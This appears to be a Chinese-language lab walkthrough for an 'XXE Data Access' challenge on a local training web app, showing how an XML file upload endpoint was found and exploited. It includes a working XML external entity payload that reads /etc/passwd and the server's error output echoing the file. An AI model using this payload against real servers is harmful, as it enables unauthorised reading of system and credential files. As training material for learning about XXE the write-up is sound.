---
title: XXE Data Access
description: 使用提交 xml 格式文件的端点，上传文件。使用错误回显信息进行 XXE 注入文件查询。
---

- 描述：Retrieve the content of C:\Windows\system.ini or /etc/passwd from the server.
- 提示：使用废弃的 B2B 接口
- 之前的挑战 Deprecated Interface 发现可上传 XML 文件的端点
    ```http://127.0.0.1:3000/#/complain```
    上传文件端点为
    ```POST /file-upload HTTP/1.1```
- 在分割字符串间，修改上传文件的请求体内容为测试 XML 格式
    ```
    Content-Disposition: form-data; name="file"; filename="test.xml"
    Content-Type: application/xml

    <?xml version="1.0" encoding="UTF-8"?>
    <aaa></aaa>
    ```
    响应体中拥有错误信息回显
    ```HTTP/1.1 410 Gone```
    ```
    Error: B2B customer complaints via file upload have been deprecated for security reasons: 
    <?xml version="1.0" encoding="UTF-8"?><aaa/> (test.xml)
    ```
- 提交 XXE 攻击向量
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <aaa>&xxe;</aaa>
    ```
    错误回显读取文件内容
    ```
    Error: B2B customer complaints via file upload have been deprecated for security reasons: 
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <aaa>root:x:0:0:root:/root:/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/sbin/nologinnonroot:x:65532:65532:nonroot:/home/nonroot:/sbin/nologin
    </aaa> (test.xml)
    ```